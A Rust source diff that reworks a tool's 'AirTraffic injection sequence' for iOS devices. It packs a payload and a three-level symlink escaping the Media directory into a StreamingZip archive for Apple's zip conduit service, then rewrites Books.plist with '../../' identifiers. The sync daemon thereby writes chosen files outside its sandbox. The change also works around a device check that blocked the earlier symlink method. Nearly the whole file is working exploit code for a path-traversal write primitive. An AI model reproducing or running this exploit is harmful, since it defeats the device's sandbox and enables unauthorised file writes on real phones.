@@ -1,7 +1,7 @@
 //! AFC staging for the AirTraffic injection sequence.
 //!
-//! Everything here is staged inside the device's Media area over AFC:
-//! a fresh `cocowall-src-<token>` directory holding the payload plus a
+//! Everything here is staged inside the device's Media area: a fresh
+//! `cocowall-src-<token>` directory holding the payload plus a
 //! three-level `p0/p1/p2/link` symlink, and a rewritten
 //! `Books/Sync/Books.plist` listing the staged objects as Book assets.
 //! When the AirTraffic daemon syncs those assets it first lands the
@@ -10,19 +10,43 @@
 //! leading slash) resolves to the real directory outside Media, and
 //! then writes the payload through it. The layout mirrors the protocol
 //! facts recorded in research/airlift-implementation-notes.md.
+//!
+//! The source directory is materialised by sending a StreamingZip
+//! archive to the `com.apple.streaming_zip_conduit` service, whose
+//! on-device daemon extracts it into `Media/<source>/`. The symlink is
+//! a zip entry (mode 0120777), never an AFC MakeLink call: on a real
+//! device the AFC daemon refuses MakeLink for a target that escapes
+//! the Media root (run #22 device test), while the conduit-extracted
+//! symlink is the layout the reference implementation ships. Payload
+//! files travel inside the same archive instead of one-by-one AFC
+//! uploads.
 
+use std::io::Write as _;
 use std::path::Path;
 
-use idevice::services::afc::{
-    opcode::{AfcFopenMode, LinkType},
-    AfcClient,
-};
+use idevice::services::afc::{opcode::AfcFopenMode, AfcClient};
+use idevice::IdeviceError;
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
 
 use crate::device_log::Logger;
+use crate::tunnel::DeviceTunnel;
 
 pub const SOURCE_PREFIX: &str = "cocowall-src-";
 pub const LINK_PREFIX: &str = "cocowall-link-";
 pub const BOOKS_PLIST_PATH: &str = "Books/Sync/Books.plist";
+pub const ZIP_CONDUIT_SERVICE: &str = "com.apple.streaming_zip_conduit";
+
+/// Format a device error with the raw status up front. AFC failures
+/// carry `IdeviceError::Afc`, whose numeric status code and variant
+/// name are what a device log needs — the run #22 failure hid them at
+/// the tail of a long description, where the UI banner truncated them
+/// away. Every staging error therefore leads with this string.
+pub fn fmt_device_err(e: &IdeviceError) -> String {
+    match e {
+        IdeviceError::Afc(a) => format!("AFC 状态码 {}（{a:?}：{a}）", a.sub_code()),
+        other => format!("{other:?}"),
+    }
+}
 
 /// Random bytes from the OS RNG, with a time/pid-mixed xorshift fallback
 /// so staging never hard-fails on RNG access.
@@ -89,14 +113,16 @@ pub async fn afc_write_file(afc: &mut AfcClient, path: &str, bytes: &[u8]) -> Re
     let mut fd = afc
         .open(path, AfcFopenMode::WrOnly)
         .await
-        .map_err(|e| format!("AFC 打开 {path} 失败: {e:?}"))?;
+        .map_err(|e| format!("AFC 打开 {path} 失败 [{}]", fmt_device_err(&e)))?;
     // Chunk large writes; the descriptor payload can be several MB.
     for chunk in bytes.chunks(512 * 1024) {
         fd.write_entire(chunk)
             .await
-            .map_err(|e| format!("AFC 写入 {path} 失败: {e:?}"))?;
+            .map_err(|e| format!("AFC 写入 {path} 失败 [{}]", fmt_device_err(&e)))?;
     }
-    fd.close().await.map_err(|e| format!("AFC 关闭 {path} 失败: {e:?}"))?;
+    fd.close()
+        .await
+        .map_err(|e| format!("AFC 关闭 {path} 失败 [{}]", fmt_device_err(&e)))?;
     Ok(())
 }
 
@@ -105,17 +131,6 @@ pub async fn afc_read_file(afc: &mut AfcClient, path: &str) -> Option<Vec<u8>> {
     let data = fd.read_entire().await.ok();
     let _ = fd.close().await;
     data
-}
-
-async fn afc_mkdirs(afc: &mut AfcClient, path: &str) {
-    let mut cur = String::new();
-    for part in path.split('/').filter(|p| !p.is_empty()) {
-        if !cur.is_empty() {
-            cur.push('/');
-        }
-        cur.push_str(part);
-        let _ = afc.mk_dir(&cur).await;
-    }
 }
 
 /// Snapshot the current Books.plist (None when absent/unreadable).
@@ -159,14 +174,210 @@ pub fn build_books_plist(identifiers: &[String]) -> Result<Vec<u8>, String> {
     Ok(buf)
 }
 
-/// Shared tail of every staging path: create the symlink chain, verify
-/// the staged objects are visible over AFC, then point Books.plist at
-/// them. On any failure the staged source directory is removed again.
+fn zip_opts(mode: u32) -> zip::write::FileOptions<'static, zip::write::ExtendedFileOptions> {
+    let mut opts = zip::write::FileOptions::default()
+        .compression_method(zip::CompressionMethod::Stored)
+        .unix_permissions(mode);
+    let mode_bytes = (mode as u16).to_le_bytes();
+    let _ = opts.add_extra_data(0x5A53, Box::new(mode_bytes), false);
+    opts
+}
+
+type ArchiveWriter = zip::ZipWriter<std::io::Cursor<Vec<u8>>>;
+
+/// Shared archive head: ZipMetadata, the p0/p1/p2 directory chain, the
+/// symlink entry, and one directory entry per component of the target
+/// path. Entry order and modes mirror the reference archive layout.
+fn archive_preamble(zip: &mut ArchiveWriter, target_tail: &str) -> Result<(), String> {
+    zip.add_directory("META-INF/", zip_opts(0o040755))
+        .map_err(|e| format!("构建暂存归档失败: {e}"))?;
+    zip.start_file("META-INF/com.apple.ZipMetadata.plist", zip_opts(0o100600))
+        .map_err(|e| format!("构建暂存归档失败: {e}"))?;
+    let mut meta = plist::Dictionary::new();
+    meta.insert("Version".into(), plist::Value::Integer(2.into()));
+    let mut meta_buf = Vec::new();
+    plist::to_writer_binary(&mut meta_buf, &plist::Value::Dictionary(meta))
+        .map_err(|e| format!("编码 ZipMetadata 失败: {e}"))?;
+    zip.write_all(&meta_buf)
+        .map_err(|e| format!("构建暂存归档失败: {e}"))?;
+
+    for dir in ["p0/", "p0/p1/", "p0/p1/p2/"] {
+        zip.add_directory(dir, zip_opts(0o040755))
+            .map_err(|e| format!("构建暂存归档失败: {e}"))?;
+    }
+
+    // The symlink itself: `p0/p1/p2/link` → `../../../{target}`. The
+    // three `..` are counted for the link's final resting place — the
+    // AirTraffic daemon lands it at the Media root, from where the
+    // relative target resolves onto the real directory.
+    zip.add_symlink(
+        "p0/p1/p2/link",
+        format!("../../../{target_tail}"),
+        zip_opts(0o120777),
+    )
+    .map_err(|e| format!("构建暂存归档失败: {e}"))?;
+
+    let mut cursor = String::new();
+    for component in target_tail.split('/') {
+        if component.is_empty() {
+            continue;
+        }
+        cursor.push_str(component);
+        cursor.push('/');
+        zip.add_directory(&cursor, zip_opts(0o040755))
+            .map_err(|e| format!("构建暂存归档失败: {e}"))?;
+    }
+    Ok(())
+}
+
+/// Archive for a folder inject: the collected tree under `payload/`.
+/// `dirs`/`files` come from stage_folder's walk, so the dot-entry and
+/// __MACOSX filtering (and the byte accounting) stay identical to the
+/// previous AFC-upload path.
+fn build_folder_archive(
+    target_parent_dir: &str,
+    dirs: &[String],
+    files: &[(String, std::path::PathBuf)],
+) -> Result<Vec<u8>, String> {
+    let target_tail = target_parent_dir.trim_start_matches('/');
+    let mut zip = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
+    archive_preamble(&mut zip, target_tail)?;
+    zip.add_directory("payload/", zip_opts(0o040755))
+        .map_err(|e| format!("构建暂存归档失败: {e}"))?;
+    for d in dirs {
+        zip.add_directory(format!("payload/{d}/"), zip_opts(0o040755))
+            .map_err(|e| format!("构建暂存归档失败: {e}"))?;
+    }
+    for (rel, path) in files {
+        zip.start_file(format!("payload/{rel}"), zip_opts(0o100644))
+            .map_err(|e| format!("构建暂存归档失败: {e}"))?;
+        let bytes = std::fs::read(path)
+            .map_err(|e| format!("读取本地文件 {} 失败: {e}", path.display()))?;
+        zip.write_all(&bytes)
+            .map_err(|e| format!("构建暂存归档失败: {e}"))?;
+    }
+    let cursor = zip
+        .finish()
+        .map_err(|e| format!("构建暂存归档失败: {e}"))?;
+    Ok(cursor.into_inner())
+}
+
+/// Archive for flat in-memory files: `payload_<idx>` entries at the
+/// archive root, matching the identifiers stage_files hands to ATC.
+fn build_files_archive(
+    target_parent_dir: &str,
+    files: &[(String, Vec<u8>)],
+) -> Result<Vec<u8>, String> {
+    let target_tail = target_parent_dir.trim_start_matches('/');
+    let mut zip = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
+    archive_preamble(&mut zip, target_tail)?;
+    for (idx, (_name, bytes)) in files.iter().enumerate() {
+        zip.start_file(format!("payload_{idx}"), zip_opts(0o100600))
+            .map_err(|e| format!("构建暂存归档失败: {e}"))?;
+        zip.write_all(bytes)
+            .map_err(|e| format!("构建暂存归档失败: {e}"))?;
+    }
+    let cursor = zip
+        .finish()
+        .map_err(|e| format!("构建暂存归档失败: {e}"))?;
+    Ok(cursor.into_inner())
+}
+
+/// Ship one archive to the streaming_zip_conduit service; its daemon
+/// extracts it into `Media/<source>/`, materialising the symlink.
+async fn conduit_extract(
+    tunnel: &mut DeviceTunnel,
+    source: &str,
+    archive: &[u8],
+    log: &Logger,
+) -> Result<(), String> {
+    let mut stream = tunnel.connect_raw_service(ZIP_CONDUIT_SERVICE, log).await?;
+
+    let mut init = plist::Dictionary::new();
+    init.insert(
+        "MediaSubdir".into(),
+        plist::Value::String(source.to_string()),
+    );
+    let mut init_buf = Vec::new();
+    plist::to_writer_binary(&mut init_buf, &plist::Value::Dictionary(init))
+        .map_err(|e| format!("编码 conduit 初始化字典失败: {e}"))?;
+    stream
+        .write_all(&(init_buf.len() as u32).to_be_bytes())
+        .await
+        .map_err(|e| format!("暂存：写 conduit 初始化长度失败: {e:?}"))?;
+    stream
+        .write_all(&init_buf)
+        .await
+        .map_err(|e| format!("暂存：写 conduit 初始化字典失败: {e:?}"))?;
+    stream
+        .write_all(archive)
+        .await
+        .map_err(|e| format!("暂存：上传 StreamingZip 归档失败: {e:?}"))?;
+    stream
+        .flush()
+        .await
+        .map_err(|e| format!("暂存：conduit flush 失败: {e:?}"))?;
+
+    let mut len_buf = [0u8; 4];
+    stream
+        .read_exact(&mut len_buf)
+        .await
+        .map_err(|e| format!("暂存：读 conduit 响应长度失败: {e:?}"))?;
+    let resp_len = u32::from_be_bytes(len_buf) as usize;
+    if resp_len > 4 * 1024 * 1024 {
+        return Err(format!("暂存：conduit 响应异常大（{resp_len} 字节），按失败处理"));
+    }
+    let mut resp = vec![0u8; resp_len];
+    stream
+        .read_exact(&mut resp)
+        .await
+        .map_err(|e| format!("暂存：读 conduit 响应失败: {e:?}"))?;
+    match plist::Value::from_reader(std::io::Cursor::new(&resp)) {
+        Ok(plist::Value::Dictionary(d)) => {
+            let keys: Vec<&str> = d.keys().map(|k| k.as_str()).collect();
+            log.log(format!(
+                "暂存：conduit 已响应（{} 字节，键：{}）",
+                resp_len,
+                keys.join(", ")
+            ));
+        }
+        _ => {
+            log.log(format!("暂存：conduit 已响应（{resp_len} 字节）"));
+        }
+    }
+    Ok(())
+}
+
+/// Best-effort removal of staging leftovers from earlier runs (e.g.
+/// the failed run #22 test left a `cocowall-src-…` tree in Media).
+/// Fresh tokens already make collisions impossible; this just keeps
+/// Media from accumulating dead trees.
+pub async fn sweep_stale_staging(afc: &mut AfcClient, log: &Logger) {
+    let names = match afc.list_dir("").await {
+        Ok(n) => n,
+        Err(_) => match afc.list_dir("/").await {
+            Ok(n) => n,
+            Err(_) => return,
+        },
+    };
+    for name in names {
+        if name.starts_with(SOURCE_PREFIX) || name.starts_with(LINK_PREFIX) {
+            let _ = afc.remove_all(&name).await;
+            log.log(format!("暂存：清理上次残留 {name}"));
+        }
+    }
+}
+
+/// Shared tail of every staging path: extract the archive through the
+/// conduit, verify the staged objects are visible over AFC, then point
+/// Books.plist at them. On any failure the staged source directory is
+/// removed again.
 async fn finish_staging(
+    tunnel: &mut DeviceTunnel,
     afc: &mut AfcClient,
     source: &str,
     link_destination: &str,
-    target_parent_dir: &str,
+    archive: &[u8],
     identifiers: Vec<String>,
     destinations: Vec<String>,
     verify_paths: &[String],
@@ -179,33 +390,30 @@ async fn finish_staging(
         destinations,
     };
 
-    let link_rel = format!("{source}/p0/p1/p2/link");
-    let link_target = format!(
-        "../../../{}",
-        target_parent_dir.trim_start_matches('/')
-    );
-
-    afc_mkdirs(afc, &format!("{source}/p0/p1/p2")).await;
-    if let Err(e) = afc
-        .link(&link_target, &link_rel, LinkType::Symlink)
-        .await
-    {
+    if let Err(e) = conduit_extract(tunnel, source, archive, log).await {
         cleanup_stage(afc, &staged).await;
-        return Err(format!("AFC 创建 symlink {link_rel} → {link_target} 失败: {e:?}"));
+        return Err(e);
     }
 
-    for path in std::iter::once(&link_rel).chain(verify_paths.iter()) {
-        if afc.get_file_info(path).await.is_err() {
+    let link_rel = format!("{source}/p0/p1/p2/link");
+    for path in std::iter::once(source)
+        .chain(std::iter::once(link_rel.as_str()))
+        .chain(verify_paths.iter().map(|p| p.as_str()))
+    {
+        if let Err(e) = afc.get_file_info(path).await {
+            let detail = fmt_device_err(&e);
             cleanup_stage(afc, &staged).await;
             return Err(format!(
-                "暂存校验失败：{path} 在 Media 区不可见（AFC get_file_info 失败）"
+                "暂存校验失败 [{detail}]：{path} 在 Media 区不可见（conduit 解压后 AFC get_file_info 失败）"
             ));
         }
     }
     log.log("暂存：源对象与 symlink 已在 Media 区就位并通过 AFC 校验".to_string());
 
     // Books.plist is what makes the daemon pick the assets up.
-    afc_mkdirs(afc, "Books/Sync").await;
+    for dir in ["Airlock", "Airlock/Book", "Books", "Books/Sync"] {
+        let _ = afc.mk_dir(dir).await;
+    }
     let books = build_books_plist(&staged.identifiers)?;
     afc_write_file(afc, BOOKS_PLIST_PATH, &books).await?;
     log.log(format!(
@@ -227,12 +435,14 @@ fn new_stage_names() -> (String, String) {
 /// Stage a whole folder as the sync payload; it lands at
 /// `<target_parent_dir>/<dest_name>` once synced.
 pub async fn stage_folder(
+    tunnel: &mut DeviceTunnel,
     afc: &mut AfcClient,
     folder: &Path,
     target_parent_dir: &str,
     dest_name: &str,
     log: &Logger,
 ) -> Result<StagedSync, String> {
+    sweep_stale_staging(afc, log).await;
     let (source, link_destination) = new_stage_names();
 
     // Collect the folder tree, skipping macOS packaging noise the same
@@ -269,22 +479,16 @@ pub async fn stage_folder(
         ));
     }
 
-    let payload_root = format!("{source}/payload");
-    afc_mkdirs(afc, &payload_root).await;
-    for d in &dirs {
-        afc_mkdirs(afc, &format!("{payload_root}/{d}")).await;
-    }
-    let mut total_bytes = 0usize;
-    for (rel, path) in &files {
-        let bytes = std::fs::read(path)
-            .map_err(|e| format!("读取本地文件 {} 失败: {e}", path.display()))?;
-        total_bytes += bytes.len();
-        afc_write_file(afc, &format!("{payload_root}/{rel}"), &bytes).await?;
-    }
+    let total_bytes: usize = files
+        .iter()
+        .map(|(_, p)| std::fs::metadata(p).map(|m| m.len() as usize).unwrap_or(0))
+        .sum();
+    let archive = build_folder_archive(target_parent_dir, &dirs, &files)?;
     log.log(format!(
-        "暂存：已上传 {} 个文件（{} 字节）到 {payload_root}",
+        "暂存：{} 个文件（{} 字节）已打包为 StreamingZip 归档（{} 字节），经 conduit 解压到 {source}",
         files.len(),
-        total_bytes
+        total_bytes,
+        archive.len()
     ));
 
     let identifiers = vec![
@@ -295,14 +499,16 @@ pub async fn stage_folder(
         link_destination.clone(),
         format!("{link_destination}/{dest_name}"),
     ];
+    let verify = vec![format!("{source}/payload")];
     finish_staging(
+        tunnel,
         afc,
         &source,
         &link_destination,
-        target_parent_dir,
+        &archive,
         identifiers,
         destinations,
-        &[payload_root],
+        &verify,
         log,
     )
     .await
@@ -311,6 +517,7 @@ pub async fn stage_folder(
 /// Stage flat files as `payload_<idx>` objects (the write_dir shape);
 /// each lands at `<target_parent_dir>/<name>`.
 pub async fn stage_files(
+    tunnel: &mut DeviceTunnel,
     afc: &mut AfcClient,
     files: &[(String, Vec<u8>)],
     target_parent_dir: &str,
@@ -319,29 +526,31 @@ pub async fn stage_files(
     if files.is_empty() {
         return Err("没有可写入的文件".to_string());
     }
+    sweep_stale_staging(afc, log).await;
     let (source, link_destination) = new_stage_names();
-    let _ = afc.mk_dir(&source).await;
+
+    let archive = build_files_archive(target_parent_dir, files)?;
+    log.log(format!(
+        "暂存：{} 个文件已打包为 StreamingZip 归档（{} 字节），经 conduit 解压到 {source}",
+        files.len(),
+        archive.len()
+    ));
 
     let mut identifiers = vec![format!("../../{source}/p0/p1/p2/link")];
     let mut destinations = vec![link_destination.clone()];
     let mut verify = Vec::new();
-    for (idx, (name, bytes)) in files.iter().enumerate() {
-        let staged_path = format!("{source}/payload_{idx}");
-        afc_write_file(afc, &staged_path, bytes).await?;
+    for (idx, (name, _bytes)) in files.iter().enumerate() {
         identifiers.push(format!("../../{source}/payload_{idx}"));
         destinations.push(format!("{link_destination}/{name}"));
-        verify.push(staged_path);
+        verify.push(format!("{source}/payload_{idx}"));
     }
-    log.log(format!(
-        "暂存：已上传 {} 个文件到 {source}",
-        files.len()
-    ));
 
     finish_staging(
+        tunnel,
         afc,
         &source,
         &link_destination,
-        target_parent_dir,
+        &archive,
         identifiers,
         destinations,
         &verify,
@@ -357,7 +566,7 @@ pub async fn list_dir_names(afc: &mut AfcClient, path: &str) -> Result<Vec<Strin
     let names = afc
         .list_dir(path)
         .await
-        .map_err(|e| format!("AFC 列目录 {path} 失败: {e:?}"))?;
+        .map_err(|e| format!("AFC 列目录 {path} 失败 [{}]", fmt_device_err(&e)))?;
     Ok(names
         .into_iter()
         .filter(|n| n != "." && n != "..")
